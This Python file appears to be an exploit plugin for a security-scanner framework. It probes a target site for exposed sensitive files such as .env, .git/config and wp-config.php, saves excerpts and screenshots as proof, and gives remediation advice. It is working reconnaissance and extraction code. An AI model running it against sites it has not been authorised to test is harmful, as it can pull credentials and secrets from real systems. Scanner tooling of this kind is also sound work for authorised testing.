"""
Information Disclosure Exploit Plugin

This plugin exploits information disclosure vulnerabilities to extract sensitive data.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class InfoDisclosurePlugin(ExploitPlugin):
    """Information Disclosure exploit plugin."""
    
    # Sensitive paths to test
    SENSITIVE_PATHS = [
        '/.env',
        '/.git/config',
        '/config.php',
        '/wp-config.php',
        '/.htaccess',
        '/web.config',
        '/robots.txt',
        '/.DS_Store',
        '/package.json',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        return 'info_disclosure'
    
    @property
    def name(self) -> str:
        return 'Information Disclosure Exploit'
    
    @property
    def description(self) -> str:
        return 'Exploits information disclosure to extract sensitive data.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate info disclosure payloads."""
        return self.SENSITIVE_PATHS
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute information disclosure attack."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests not available', 'vulnerability_type': 'info_disclosure'}
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        from urllib.parse import urljoin
        disclosed_info = {}
        
        # Try to access sensitive paths
        for path in self.SENSITIVE_PATHS[:5]:
            try:
                url = urljoin(target_url, path)
                response = requests.get(url, timeout=timeout, verify=verify_ssl)
                
                if response.status_code == 200 and len(response.text) > 10:
                    disclosed_info[path] = response.text[:500]
                    logger.info(f"Found exposed file: {path}")
            except Exception as e:
                logger.debug(f"Error accessing {path}: {e}")
        
        if disclosed_info:
            result = {
                'success': True,
                'disclosed_info': disclosed_info,
                'evidence': f'Found {len(disclosed_info)} exposed file(s)',
                'vulnerability_type': 'info_disclosure',
                'message': 'Successfully extracted sensitive information',
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(
                    target_url, disclosed_info, config
                )
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        
        return {'success': False, 'error': 'No information disclosed', 'vulnerability_type': 'info_disclosure'}
    
    def _capture_visual_proof(self, base_url: str, disclosed_info: Dict[str, str],
                              config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of information disclosure.
        
        Args:
            base_url: Base target URL
            disclosed_info: Dictionary of disclosed file paths and their content
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            from urllib.parse import urljoin
            proof_capture = VisualProofCapture()
            
            # Capture screenshots of each exposed file (limit to first 3)
            for idx, (path, content) in enumerate(list(disclosed_info.items())[:3]):
                url = urljoin(base_url, path)
                
                screenshot_data = proof_capture.capture_screenshot(
                    url,
                    wait_time=1.5
                )
                
                if screenshot_data:
                    # Determine file type for better description
                    file_type = 'Configuration'
                    if '.env' in path:
                        file_type = 'Environment Variables'
                    elif '.git' in path:
                        file_type = 'Git Repository'
                    elif 'config' in path.lower():
                        file_type = 'Configuration'
                    elif 'package.json' in path:
                        file_type = 'Package Manifest'
                    elif '.htaccess' in path or 'web.config' in path:
                        file_type = 'Web Server Configuration'
                    
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': f'Info Disclosure - Exposed {file_type} File',
                        'description': f'Sensitive file exposed at {path}',
                        'exploit_step': f'Accessed exposed file: {path}',
                        'file_path': path,
                        'content_preview': content[:200] + ('...' if len(content) > 200 else '')
                    })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent information disclosure:\n'
            '1. Remove sensitive files from web root\n'
            '2. Implement proper access controls\n'
            '3. Sanitize error messages\n'
            '4. Disable directory listing\n'
            '5. Use .gitignore properly\n'
            '6. Implement security headers'
        )
